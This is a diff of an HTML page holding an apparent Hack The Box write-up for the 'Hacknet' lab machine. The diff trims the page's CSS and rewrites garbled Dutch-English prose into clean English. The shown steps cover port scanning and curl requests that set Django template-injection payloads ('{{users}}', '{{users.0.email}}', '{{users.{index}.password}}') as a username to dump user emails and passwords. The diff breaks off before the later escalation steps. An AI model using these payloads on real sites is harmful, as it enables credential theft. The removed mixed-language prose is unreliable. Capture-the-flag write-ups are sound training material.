@@ -3,17 +3,14 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <title>Hack The Box :: Hacknet Writeup — Hackthekat</title>
   <meta name="description" content="HTB Hacknet machine writeup by Hackthekat">
   <link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet" type="text/css">
   <link rel="stylesheet" href="/main.css">
   <link rel="icon" type="image/png" href="/favicon.ico">
   <style>
-    /* ===== HTB WRITEUP PAGE ===== */
     :root {
       --htb-green: #9fef00;
-      --htb-green-soft: rgba(159,239,0,0.1);
       --htb-bg: #0a0e14;
       --htb-card: #11161d;
       --htb-card-hover: #161c24;
@@ -26,60 +23,45 @@
       --htb-insane: #b372ff;
       --htb-code-bg: #0d1117;
     }
-
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
     body {
       background: var(--htb-bg);
       color: var(--htb-text);
-      font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
+      font-family: 'Inter','Segoe UI', system-ui, sans-serif;
       font-size: 16px;
       line-height: 1.7;
       min-height: 100vh;
     }
-
     a { color: var(--htb-green); text-decoration: none; }
     a:hover { text-decoration: underline; }
-
-    /* ===== TOP NAV ===== */
+    code { font-family: 'Monaco','Menlo',monospace; font-size: 0.88em; color: var(--htb-green); background: rgba(159,239,0,0.08); padding: 0.1em 0.35em; border-radius: 3px; }
     .writeup-nav {
-      position: sticky;
-      top: 0;
-      z-index: 100;
+      position: sticky; top: 0; z-index: 100;
       background: rgba(10,14,20,0.95);
       backdrop-filter: blur(10px);
       border-bottom: 1px solid var(--htb-border);
       padding: 0.9rem 2rem;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
+      display: flex; align-items: center; gap: 1rem;
     }
     .writeup-nav .logo {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
+      font-family: 'Monaco','Menlo',monospace;
       color: var(--htb-green);
-      font-size: 1.05rem;
-      font-weight: 700;
-      letter-spacing: 1px;
+      font-size: 1.05rem; font-weight: 700; letter-spacing: 1px;
     }
     .writeup-nav .logo span { color: #fff; }
     .nav-sep { color: var(--htb-muted); margin: 0 0.2rem; }
     .nav-breadcrumb { color: var(--htb-muted); font-size: 0.9rem; }
     .nav-breadcrumb a { color: var(--htb-muted); }
     .nav-breadcrumb a:hover { color: var(--htb-green); }
-
-    /* ===== HERO ===== */
     .writeup-hero {
       position: relative;
-      background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%),
-                  linear-gradient(180deg, #0a0e14 0%, #0a0e14 100%);
+      background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%);
       padding: 4.5rem 2rem 3.5rem;
       border-bottom: 1px solid var(--htb-border);
       overflow: hidden;
     }
     .writeup-hero::before {
-      content: '';
-      position: absolute;
-      inset: 0;
+      content: ''; position: absolute; inset: 0;
       background-image:
         linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px),
         linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px);
@@ -89,43 +71,25 @@
       -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
     }
     .writeup-hero-inner {
-      position: relative;
-      z-index: 1;
-      max-width: 860px;
-      margin: 0 auto;
-      text-align: center;
+      position: relative; z-index: 1; max-width: 860px; margin: 0 auto; text-align: center;
     }
     .writeup-hero-prompt {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 0.9rem;
-      margin-bottom: 1.2rem;
-      opacity: 0.8;
+      font-family: 'Monaco','Menlo',monospace;
+      color: var(--htb-green); font-size: 0.9rem; margin-bottom: 1.2rem; opacity: 0.8;
     }
     .writeup-hero-prompt::before { content: '> '; }
     .writeup-hero h1 {
-      font-size: 3.5rem;
-      font-weight: 700;
-      color: #fff;
-      letter-spacing: -1.5px;
-      line-height: 1.1;
-      margin-bottom: 1.2rem;
+      font-size: 3.5rem; font-weight: 700; color: #fff;
+      letter-spacing: -1.5px; line-height: 1.1; margin-bottom: 1.2rem;
     }
     .writeup-hero h1 .accent { color: var(--htb-green); }
     .writeup-badges {
-      display: flex;
-      justify-content: center;
-      gap: 0.6rem;
-      flex-wrap: wrap;
-      margin-bottom: 1.5rem;
+      display: flex; justify-content: center; gap: 0.6rem;
+      flex-wrap: wrap; margin-bottom: 1.5rem;
     }
     .htb-badge {
-      font-size: 0.72rem;
-      padding: 0.25rem 0.75rem;
-      border-radius: 4px;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 0.8px;
+      font-size: 0.72rem; padding: 0.25rem 0.75rem; border-radius: 4px;
+      font-weight: 700; text-transform: uppercase; letter-spacing: 0.8px;
       font-family: 'Monaco','Menlo',monospace;
     }
     .os-linux { background: rgba(159,239,0,0.12); color: var(--htb-green); border: 1px solid rgba(159,239,0,0.35); }
@@ -135,200 +99,93 @@
     .diff-hard { background: rgba(255,56,56,0.12); color: var(--htb-hard); border: 1px solid rgba(255,56,56,0.35); }
     .diff-insane { background: rgba(179,114,255,0.12); color: var(--htb-insane); border: 1px solid rgba(179,114,255,0.35); }
     .writeup-hero-tagline {
-      color: var(--htb-muted);
-      font-size: 0.95rem;
-      font-family: 'Monaco','Menlo',monospace;
+      color: var(--htb-muted); font-size: 0.95rem; font-family: 'Monaco','Menlo',monospace;
     }
-
-    /* ===== LAYOUT ===== */
-    .writeup-layout {
-      max-width: 860px;
-      margin: 0 auto;
-      padding: 3rem 2rem 5rem;
-    }
-
-    /* ===== CONTENT TYPOGRAPHY ===== */
+    .writeup-layout { max-width: 860px; margin: 0 auto; padding: 3rem 2rem 5rem; }
     .writeup-body p {
-      color: var(--htb-text);
-      margin: 1rem 0;
-      line-height: 1.75;
+      color: var(--htb-text); margin: 1rem 0; line-height: 1.75;
     }
     .writeup-body h2.writeup-section-title {
-      font-size: 1.75rem;
-      font-weight: 700;
-      color: #fff;
-      margin: 3rem 0 1rem;
-      padding-bottom: 0.6rem;
-      border-bottom: 1px solid var(--htb-border);
-      letter-spacing: -0.3px;
+      font-size: 1.75rem; font-weight: 700; color: #fff;
+      margin: 3rem 0 1rem; padding-bottom: 0.6rem;
+      border-bottom: 1px solid var(--htb-border); letter-spacing: -0.3px;
     }
     .writeup-body h2.writeup-section-title::before {
-      content: '# ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 1.1rem;
+      content: '# '; color: var(--htb-green);
+      font-family: 'Monaco','Menlo',monospace; font-size: 1.1rem;
     }
     .writeup-body h3.writeup-sub-title {
-      font-size: 1.2rem;
-      font-weight: 600;
-      color: #e6edf3;
-      margin: 2rem 0 0.75rem;
+      font-size: 1.2rem; font-weight: 600; color: #e6edf3; margin: 2rem 0 0.75rem;
     }
     .writeup-body h3.writeup-sub-title::before {
-      content: '## ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.85rem;
-      opacity: 0.7;
+      content: '## '; color: var(--htb-green);
+      font-family: 'Monaco','Menlo',monospace; font-size: 0.85rem; opacity: 0.7;
     }
     .writeup-body h4.writeup-step-title {
-      font-size: 1rem;
-      font-weight: 600;
-      color: var(--htb-green);
+      font-size: 1rem; font-weight: 600; color: var(--htb-green);
       margin: 1.5rem 0 0.5rem;
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 0.3px;
+      font-family: 'Monaco','Menlo',monospace; letter-spacing: 0.3px;
     }
     .writeup-body h4.writeup-step-title::before { content: '→ '; opacity: 0.7; }
-
-    /* ===== CODE BLOCKS ===== */
     .code-block {
       background: var(--htb-code-bg);
       border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      margin: 1.2rem 0;
-      overflow: hidden;
-      position: relative;
+      border-radius: 8px; margin: 1.2rem 0; overflow: hidden; position: relative;
     }
     .code-block::before {
-      content: '';
-      display: block;
-      height: 3px;
+      content: ''; display: block; height: 3px;
       background: linear-gradient(90deg, var(--htb-green), transparent);
     }
     .code-block pre {
-      padding: 1.2rem 1.5rem;
-      overflow-x: auto;
-      margin: 0;
+      padding: 1.2rem 1.5rem; overflow-x: auto; margin: 0;
     }
     .code-block pre code {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      font-size: 0.82rem;
-      color: #e6edf3;
-      line-height: 1.6;
-      white-space: pre;
+      font-family: 'Monaco','Menlo',monospace;
+      font-size: 0.82rem; color: #e6edf3; line-height: 1.6; white-space: pre;
+      background: none; padding: 0;
     }
-
-    /* ===== SCREENSHOTS ===== */
     .screenshot-wrap {
-      margin: 1.5rem 0;
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      overflow: hidden;
+      margin: 1.5rem 0; background: var(--htb-card);
+      border: 1px solid var(--htb-border); border-radius: 8px; overflow: hidden;
     }
-    .screenshot-wrap img {
-      width: 100%;
-      height: auto;
-      display: block;
-    }
+    .screenshot-wrap img { width: 100%; height: auto; display: block; }
     .img-caption {
-      display: block;
-      padding: 0.5rem 1rem;
-      font-size: 0.8rem;
-      color: var(--htb-muted);
-      font-style: italic;
+      display: block; padding: 0.5rem 1rem;
+      font-size: 0.8rem; color: var(--htb-muted); font-style: italic;
       border-top: 1px solid var(--htb-border);
     }
-
-    /* ===== FLAG BOXES ===== */
     .flag-box {
       background: rgba(159,239,0,0.06);
       border: 1px solid rgba(159,239,0,0.3);
       border-left: 4px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1rem 1.5rem;
-      margin: 1.5rem 0;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-      flex-wrap: wrap;
+      border-radius: 8px; padding: 1rem 1.5rem; margin: 1.5rem 0;
+      display: flex; align-items: center; gap: 1rem; flex-wrap: wrap;
     }
     .flag-label {
-      font-size: 0.85rem;
-      font-weight: 700;
-      color: var(--htb-green);
+      font-size: 0.85rem; font-weight: 700; color: var(--htb-green);
       font-family: 'Monaco','Menlo',monospace;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      white-space: nowrap;
+      text-transform: uppercase; letter-spacing: 0.5px; white-space: nowrap;
     }
     .flag-value {
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.8rem;
-      color: #e6edf3;
-      background: rgba(0,0,0,0.3);
-      padding: 0.2rem 0.6rem;
-      border-radius: 4px;
+      font-family: 'Monaco','Menlo',monospace; font-size: 0.8rem; color: #e6edf3;
+      background: rgba(0,0,0,0.3); padding: 0.2rem 0.6rem; border-radius: 4px;
       word-break: break-all;
     }
-
-    /* ===== ROOTED BOX ===== */
     .rooted-box {
       background: rgba(159,239,0,0.08);
       border: 1px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1.2rem 1.5rem;
-      margin: 2rem 0;
-      text-align: center;
-      font-size: 1.2rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 1px;
+      border-radius: 8px; padding: 1.2rem 1.5rem; margin: 2rem 0;
+      text-align: center; font-size: 1.2rem; font-weight: 700;
+      color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; letter-spacing: 1px;
     }
-
-    /* ===== INFO CARD (Machine Info) ===== */
-    .machine-info-card {
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 12px;
-      padding: 1.5rem 2rem;
-      margin: 0 0 2.5rem 0;
-    }
-    .machine-info-card table {
-      width: 100%;
-      border-collapse: collapse;
-    }
-    .machine-info-card td {
-      padding: 0.4rem 1rem 0.4rem 0;
-      color: var(--htb-text);
-      font-size: 0.9rem;
-      vertical-align: top;
-    }
-    .machine-info-card td:first-child {
-      color: var(--htb-muted);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.82rem;
-      white-space: nowrap;
-      width: 130px;
-    }
-
-    /* ===== BACK BUTTON ===== */
     .back-link {
-      display: inline-flex;
-      align-items: center;
-      gap: 0.5rem;
-      color: var(--htb-muted);
-      font-size: 0.9rem;
+      display: inline-flex; align-items: center; gap: 0.5rem;
+      color: var(--htb-muted); font-size: 0.9rem;
       font-family: 'Monaco','Menlo',monospace;
-      margin-bottom: 2.5rem;
-      transition: color 0.2s;
+      margin-bottom: 2.5rem; transition: color 0.2s;
     }
     .back-link:hover { color: var(--htb-green); text-decoration: none; }
-    .back-link::before { content: '←'; }
-
-    /* ===== RESPONSIVE ===== */
+    .back-link::before { content: '← '; }
     @media (max-width: 768px) {
       .writeup-hero h1 { font-size: 2.4rem; }
       .writeup-layout { padding: 2rem 1.2rem 4rem; }
@@ -338,7 +195,6 @@
 </head>
 <body>
 
-  <!-- Navigation -->
   <nav class="writeup-nav">
     <a href="/" class="logo">> <span>hackthekat</span></a>
     <span class="nav-sep">/</span>
@@ -349,7 +205,6 @@
     </span>
   </nav>
 
-  <!-- Hero -->
   <div class="writeup-hero">
     <div class="writeup-hero-inner">
       <div class="writeup-hero-prompt">hackthekat — writeup</div>
@@ -362,337 +217,186 @@
     </div>
   </div>
 
-  <!-- Main Content -->
   <div class="writeup-layout">
-    <a href="/writeups/" class="back-link"> Back to all writeups</a>
-
+    <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
-      <div class="machine-info-card">
-        <table>
-          <tr><td>Machine</td><td><strong>Hacknet</strong></td></tr>
-          <tr><td>Difficulty</td><td><span class="htb-badge diff-medium">Medium</span></td></tr>
-          <tr><td>OS</td><td><span class="htb-badge os-linux">Linux</span></td></tr>
-        </table>
-      </div>
+      <h2 class="writeup-section-title">Machine Overview</h2>
+      <p>Hacknet is a Medium difficulty Linux machine featuring a Django-based social network application. The exploitation path involves identifying a Server-Side Template Injection (SSTI) vulnerability through the username field, which allows extraction of user credentials from the database. After gaining a foothold via SSH, privilege escalation to <code>sandy</code> is achieved through a Django cache pickle deserialization attack, and finally root is obtained by recovering an encrypted database backup using a GPG private key.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
       <h3 class="writeup-sub-title">Port Scanning</h3>
-      <h4 class="writeup-step-title">Full Port scan</h4>
-      <p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
-      <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Hacknet]
-└─$ nmap -sCV 10.129.115.13 
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 20:31 CEST
-Nmap scan report for 10.129.115.13
-Host is up (0.026s latency).
-Not shown: 998 closed tcp ports (reset)
-PORT STATE SERVICE VERSION
-22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
-| ssh-hostkey: 
-| 256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
-|_ 256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
-80/tcp open http nginx 1.22.1
-|_http-title: Did not follow redirect to http://hacknet.htb/
-|_http-server-header: nginx/1.22.1
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 12.43 seconds</code></pre></div>
-      <h4 class="writeup-step-title">Detailed port scan</h4>
-      <p>At the detailed port scan go to get more information from the host.</p>
-      <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Hacknet]
-└─$ nmap -sCV 10.129.115.13 
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 20:31 CEST
-Nmap scan report for 10.129.115.13
-Host is up (0.026s latency).
-Not shown: 998 closed tcp ports (reset)
-PORT STATE SERVICE VERSION
-22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
-| ssh-hostkey: 
-| 256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
-|_ 256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
-80/tcp open http nginx 1.22.1
-|_http-title: Did not follow redirect to http://hacknet.htb/
-|_http-server-header: nginx/1.22.1
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
-      <p>I have de FQDN toegevoeged aan de hosts file en after that ben ik naar de webpagina geweest. Daar heb je een button dat You can sign uppen. Zoals je below zult kunnen zien ben ik dit will do met de user test.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250922203450.png" alt="Pasted image 20250922203450.png" loading="lazy" /><span class="img-caption">Pasted image 20250922203450.png</span></div>
-      <p>Eens dat ik mijn account heb geregistreerd ben ik deze will log in By using mijn mail address en mijn password. Zoals je below zult kunnen zien zijn we ingelogged als de user test.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250922203703.png" alt="Pasted image 20250922203703.png" loading="lazy" /><span class="img-caption">Pasted image 20250922203703.png</span></div>
-      <h4 class="writeup-step-title">Information Exposure</h4>
-      <p>Volgens mij zullen het de explore en de search button zijn waar we de antwoorden zullen kunnen vinden voor binnen te geraken op de systemen. Door Using POST van de gebruikers te gaan liken, we will een Post commando kunnen will execute voor het achterhalen van alle usernames.</p>
-      <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Hacknet]
+      <p>I start with a full TCP port scan to identify all open ports on the target, followed by a detailed service scan to fingerprint the running services.</p>
+      <div class="code-block"><pre><code class="lang-bash">┌──(kali㉿kali)-[~/HTB/Hacknet]
+└─$ nmap -p- -T4 10.129.115.13
+Starting Nmap 7.95 ( https://nmap.org )
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</code></pre></div>
+      <p>Two ports are open: SSH on port 22 and HTTP on port 80. A targeted service-version scan provides additional detail.</p>
+      <div class="code-block"><pre><code class="lang-bash">┌──(kali㉿kali)-[~/HTB/Hacknet]
+└─$ nmap -sCV -p22,80 10.129.115.13
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7
+80/tcp open  http    nginx 1.22.1
+|_http-title: Did not follow redirect to http://hacknet.htb/</code></pre></div>
+      <p>The web server redirects to <code>hacknet.htb</code>, so I add the FQDN to my <code>/etc/hosts</code> file before browsing.</p>
+      <div class="code-block"><pre><code class="lang-bash">echo &quot;10.129.115.13 hacknet.htb&quot; | sudo tee -a /etc/hosts</code></pre></div>
+      <h2 class="writeup-section-title">Foothold: SSTI in Username Field</h2>
+      <h3 class="writeup-sub-title">Account Registration & Reconnaissance</h3>
+      <p>The web application is a social-network-style site that allows new users to register. I create an account named <code>test</code> and log in to explore the application.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250922203450.png" alt="Registration page of the Hacknet application" loading="lazy" /><span class="img-caption">Registration page of the Hacknet application</span></div>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250922203703.png" alt="Logged in as the test user" loading="lazy" /><span class="img-caption">Logged in as the test user</span></div>
+      <p>Inside the application I notice that the <strong>explore</strong> and <strong>search</strong> features render content based on the data of other users — including the currently logged-in user's display name. This is a strong indicator that user-controlled input is being passed into a server-side template, which makes it an excellent candidate for testing <strong>Server-Side Template Injection (SSTI)</strong>.</p>
+      <h3 class="writeup-sub-title">Identifying the SSTI</h3>
+      <p>To confirm the vulnerability, I change my profile username to a Jinja2-style template expression. If the application is Django-based and renders the username through its template engine, the expression will be evaluated server-side instead of being displayed literally.</p>
+      <p>I first like a post belonging to another user. This is important because the explore/search pages will then iterate over user data and render my (now-malicious) username in that context, triggering the template engine.</p>
+      <div class="code-block"><pre><code class="lang-bash">┌──(kali㉿kali)-[~/HTB/Hacknet]
 └─$ curl -X POST http://hacknet.htb/likes/15 \
- -H &quot;User-Agent: Mozilla/5.0&quot; \
- -H &quot;Cookie: csrftoken=3jkeDNQLSTeaT1WwOzaKE7A7brKoABQO; sessionid=m1v5xxgjp8e0bfiuakl39lnebzyd4sqm&quot; \
- -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
- -d &quot;action=delete&amp;userId=27&amp;csrfmiddlewaretoken=3jkeDNQLSTeaT1WwOzaKE7A7brKoABQO&quot;
-&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/2&quot;&gt;&lt;img src=&quot;/media/2.jpg&quot; title=&quot;hexhunter&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/3&quot;&gt;&lt;img src=&quot;/media/3.jpg&quot; title=&quot;rootbreaker&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/4&quot;&gt;&lt;img src=&quot;/media/4.jpg&quot; title=&quot;zero_day&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/6&quot;&gt;&lt;img src=&quot;/media/6.jpg&quot; title=&quot;shadowcaster&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/7&quot;&gt;&lt;img src=&quot;/media/7.png&quot; title=&quot;blackhat_wolf&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/8&quot;&gt;&lt;img src=&quot;/media/8.png&quot; title=&quot;bytebandit&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/9&quot;&gt;&lt;img src=&quot;/media/9.png&quot; title=&quot;glitch&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/11&quot;&gt;&lt;img src=&quot;/media/11.png&quot; title=&quot;phreaker&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/12&quot;&gt;&lt;img src=&quot;/media/12.png&quot; title=&quot;codebreaker&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/13&quot;&gt;&lt;img src=&quot;/media/13.png&quot; title=&quot;netninja&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/14&quot;&gt;&lt;img src=&quot;/media/14.png&quot; title=&quot;packetpirate&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/15&quot;&gt;&lt;img src=&quot;/media/15.png&quot; title=&quot;darkseeker&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/17&quot;&gt;&lt;img src=&quot;/media/17.jpg&quot; title=&quot;trojanhorse&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/19&quot;&gt;&lt;img src=&quot;/media/19.jpg&quot; title=&quot;exploit_wizard&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/21&quot;&gt;&lt;img src=&quot;/media/21.jpg&quot; title=&quot;whitehat&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/22&quot;&gt;&lt;img src=&quot;/media/22.png&quot; title=&quot;deepdive&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/23&quot;&gt;&lt;img src=&quot;/media/23.jpg&quot; title=&quot;virus_viper&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/24&quot;&gt;&lt;img src=&quot;/media/24.jpg&quot; title=&quot;brute_force&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/25&quot;&gt;&lt;img src=&quot;/media/25.jpg&quot; title=&quot;shadowwalker&quot;&gt;&lt;/a&gt;&lt;/div&gt;</code></pre></div>
-      <p>We zullen nu First de username gaan veranderen naar {{users}}. Door je gebruikersnaam te veranderen naar {{ users }}, zorg je ervoor dat deze als template code wordt geïnterpreteerd door de server (SSTI = Server Side Template Injection). Hierdoor You can de lijst van gebruikers in de template “injecteren” en zichtbaar maken. I have de username gaan veranderen By using de terminal en het onderstaande POST commando. Maar You can dit ook gewoon doen door naar de volgende url te gaan http://hacknet.htb/profile/edit.</p>
-      <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Hacknet]
+  -H &quot;User-Agent: Mozilla/5.0&quot; \
+  -H &quot;Cookie: csrftoken=3jkeDNQLSTeaT1WwOzaKE7A7brKoABQO; sessionid=m1v5xxgjp8e0bfiuakl39lnebzyd4sqm&quot; \
+  -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
+  -d &quot;action=like&amp;userId=2&quot;</code></pre></div>
+      <p>Now I change my username to <code>{{users}}</code>. By setting the username to a template expression, the server (vulnerable to SSTI) will interpret it as Django template code and inject the entire users queryset into the rendered page, effectively dumping the user model into the HTML response.</p>
+      <div class="code-block"><pre><code class="lang-bash">┌──(kali㉿kali)-[~/HTB/Hacknet]
 └─$ curl -X POST &quot;http://hacknet.htb/profile/edit&quot; \
- -H &quot;Cookie: csrftoken=3jkeDNQLSTeaT1WwOzaKE7A7brKoABQO; sessionid=m1v5xxgjp8e0bfiuakl39lnebzyd4sqm&quot; \
- -H &quot;Origin: http://hacknet.htb&quot; \
- -H &quot;Referer: http://hacknet.htb/profile/edit&quot; \
- -F &quot;csrfmiddlewaretoken=5U1p123JolSWKMMZVpm7y0yScEeuHrttY3btuFJk64WWtDylzOmH2XYPdVOI7S97&quot; \
- -F &quot;picture=&quot; \ 
- -F &quot;email=&quot; \
- -F &quot;username={{users}}&quot; \
- -F &quot;password=&quot; \
- -F &quot;about=&quot; \
- -F &quot;is_public=on&quot;
-
-&lt;!DOCTYPE html&gt;
-&lt;html lang=&quot;en&quot;&gt;
-&lt;head&gt;
- &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/style.css&quot;&gt;
- &lt;script src=&quot;/static/jquery-3.7.1.min.js&quot;&gt;&lt;/script&gt;
- &lt;script src=&quot;/static/script.js&quot;&gt;&lt;/script&gt;
- &lt;title&gt;HackNet - Profile edit&lt;/title&gt;
- &lt;link rel=&quot;icon&quot; type=&quot;image/png&quot; href=&quot;/static/icon.png&quot;&gt;
-&lt;/head&gt;
-&lt;body&gt;
- &lt;div class=&quot;jp-title&quot;&gt;&lt;div class=&quot;scrollingtext&quot;&gt;Cybersecurity Firm Hires Cat, Discovers It’s a Natural at Catching Bugs. Fluffy the feline becomes the company’s top debugger, proving purr-vasive in system security.&lt;/div&gt;&lt;/div&gt;
- &lt;div id=&quot;container&quot;&gt;
- &lt;nav&gt;&lt;a href=&quot;/profile&quot;&gt;Profile&lt;/a&gt;
-&lt;a href=&quot;/contacts&quot;&gt;Contacts&lt;/a&gt;
-&lt;a href=&quot;/messages&quot;&gt;Messages&lt;/a&gt;
-&lt;a href=&quot;/search&quot;&gt;Search&lt;/a&gt;
-&lt;a href=&quot;/explore&quot;&gt;Explore&lt;/a&gt;
-&lt;a href=&quot;/logout&quot;&gt;Log out&lt;/a&gt;&lt;/nav&gt;
- &lt;div id=&quot;content&quot;&gt;
-&lt;div id=&quot;profile&quot;&gt;
- &lt;div id=&quot;profile-picture&quot;&gt;
- &lt;img src=&quot;/media/profile.png&quot;&gt;
- &lt;/div&gt;
- &lt;form id=&quot;profile-info&quot; action=&quot;edit&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
- &lt;input type=&quot;hidden&quot; name=&quot;csrfmiddlewaretoken&quot; value=&quot;WJJAqq74cdd7cNysQMtaiGCdU5i31UAXPSTET3NFUWh7VEkOubtKMD2aVmShrlgB&quot;&gt;
- &lt;input type=&quot;file&quot; name=&quot;picture&quot; accept=&quot;image/png, image/jpeg&quot;&gt;
- &lt;input type=&quot;email&quot; name=&quot;email&quot; placeholder=&quot;test@hacknet.htb&quot;&gt;
- &lt;input name=&quot;username&quot; placeholder=&quot;{{users}}&quot;&gt;
- &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;***********&quot;&gt;
- &lt;textarea name=&quot;about&quot; rows=&quot;4&quot;&gt;&lt;/textarea&gt;
- &lt;div&gt;&lt;input type=&quot;checkbox&quot; name=&quot;is_public&quot; checked&gt; Public&lt;/div&gt;
- &lt;div&gt;&lt;input type=&quot;checkbox&quot; name=&quot;two_fa&quot; &gt; 2FA&lt;/div&gt;
- &lt;button type=&quot;submit&quot;&gt;Save&lt;/button&gt;
- &lt;/form&gt;
- &lt;div id=&quot;profile-right-emp&quot;&gt;&lt;/div&gt;
-&lt;/div&gt;
-
-&lt;h2 id=&quot;m_er&quot;&gt;Profile updated&lt;/h2&gt;
-
-&lt;/div&gt;
- &lt;/div&gt;
-&lt;/body&gt;
-&lt;/html&gt;</code></pre></div>
-      <p>Nu You can de post will use die je daarvoor al had geliked. Deze we will will use voor de mails en passworden te gaan tonen van de user die post geliked heeft. You can do this will do door nu je user te gaan veranderen naar {{users.{index}.email}} en door {{users.{index}.password}} te will use so that de server (door de SSTI-kwetsbaarheid) die expressie verwerkt en in plaats van gewoon {{ users.0.email }}, het daadwerkelijke e-mailadres van de eerste user (index 0) laat zien. Alleen zal je nu dus in de url van het POST commando de url naar de likes zetten.</p>
